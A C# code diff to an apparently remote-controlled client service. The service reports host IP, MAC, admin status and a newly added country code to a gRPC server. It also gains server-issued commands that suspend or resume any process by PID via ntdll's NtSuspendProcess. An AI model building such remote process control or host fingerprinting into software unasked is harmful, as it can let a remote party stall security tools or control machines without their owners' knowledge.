@@ -1,6 +1,7 @@
 using System.Diagnostics;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using Grpc.Core;
 using Grpc.Net.Client;
@@ -138,7 +139,8 @@ public class GrpcClientService : BackgroundService
             ClientVersion = GetClientVersion(),
             IpAddress = GetLocalIpAddress(),
             MacAddress = GetPrimaryMacAddress(),
-            IsAdmin = IsRunningAsAdmin()
+            IsAdmin = IsRunningAsAdmin(),
+            CountryCode = GetCountryCode()
         };
 
         var message = new ClientMessage
@@ -347,6 +349,14 @@ public class GrpcClientService : BackgroundService
 
                 case "update_available":
                     result = await HandleUpdateAvailableAsync(command, ct);
+                    break;
+
+                case "freezeprocess":
+                    result = await FreezeProcessAsync(command);
+                    break;
+
+                case "resumeprocess":
+                    result = await ResumeProcessAsync(command);
                     break;
 
                 case "server_shutdown":
@@ -625,6 +635,21 @@ public class GrpcClientService : BackgroundService
         }
     }
 
+    private static string GetCountryCode()
+    {
+        try
+        {
+            // Get the current region from Windows settings
+            var regionInfo = new System.Globalization.RegionInfo(
+                System.Globalization.CultureInfo.CurrentCulture.Name);
+            return regionInfo.TwoLetterISORegionName;
+        }
+        catch
+        {
+            return "XX"; // Unknown
+        }
+    }
+
     private static string GetClientVersion()
     {
         // Try to read from version file first (updated by updater)
@@ -647,6 +672,107 @@ public class GrpcClientService : BackgroundService
 
         // Use the VersionInfo class (most reliable for single-file apps)
         return TorGames.Client.VersionInfo.Version;
+    }
+
+    // P/Invoke declarations for process suspend/resume
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int NtSuspendProcess(IntPtr processHandle);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int NtResumeProcess(IntPtr processHandle);
+
+    private async Task<CommandResult> FreezeProcessAsync(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            if (!int.TryParse(command.CommandText, out var pid))
+            {
+                result.Success = false;
+                result.ErrorMessage = "Invalid PID format";
+                return result;
+            }
+
+            _logger.LogInformation("Freezing process with PID: {Pid}", pid);
+
+            var process = Process.GetProcessById(pid);
+            var status = NtSuspendProcess(process.Handle);
+
+            if (status == 0)
+            {
+                result.Success = true;
+                result.Stdout = $"Process {process.ProcessName} (PID: {pid}) has been frozen";
+                _logger.LogInformation("Process {ProcessName} (PID: {Pid}) frozen successfully", process.ProcessName, pid);
+            }
+            else
+            {
+                result.Success = false;
+                result.ErrorMessage = $"Failed to freeze process. NTSTATUS: 0x{status:X8}";
+                _logger.LogWarning("Failed to freeze process PID {Pid}. NTSTATUS: 0x{Status:X8}", pid, status);
+            }
+        }
+        catch (ArgumentException)
+        {
+            result.Success = false;
+            result.ErrorMessage = $"Process with PID {command.CommandText} not found";
+            _logger.LogWarning("Process with PID {Pid} not found", command.CommandText);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Error freezing process PID {Pid}", command.CommandText);
+        }
+
+        return await Task.FromResult(result);
+    }
+
+    private async Task<CommandResult> ResumeProcessAsync(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            if (!int.TryParse(command.CommandText, out var pid))
+            {
+                result.Success = false;
+                result.ErrorMessage = "Invalid PID format";
+                return result;
+            }
+
+            _logger.LogInformation("Resuming process with PID: {Pid}", pid);
+
+            var process = Process.GetProcessById(pid);
+            var status = NtResumeProcess(process.Handle);
+
+            if (status == 0)
+            {
+                result.Success = true;
+                result.Stdout = $"Process {process.ProcessName} (PID: {pid}) has been resumed";
+                _logger.LogInformation("Process {ProcessName} (PID: {Pid}) resumed successfully", process.ProcessName, pid);
+            }
+            else
+            {
+                result.Success = false;
+                result.ErrorMessage = $"Failed to resume process. NTSTATUS: 0x{status:X8}";
+                _logger.LogWarning("Failed to resume process PID {Pid}. NTSTATUS: 0x{Status:X8}", pid, status);
+            }
+        }
+        catch (ArgumentException)
+        {
+            result.Success = false;
+            result.ErrorMessage = $"Process with PID {command.CommandText} not found";
+            _logger.LogWarning("Process with PID {Pid} not found", command.CommandText);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = ex.Message;
+            _logger.LogError(ex, "Error resuming process PID {Pid}", command.CommandText);
+        }
+
+        return await Task.FromResult(result);
     }
 
     private async Task<CommandResult> HandleUpdateAvailableAsync(Command command, CancellationToken ct)
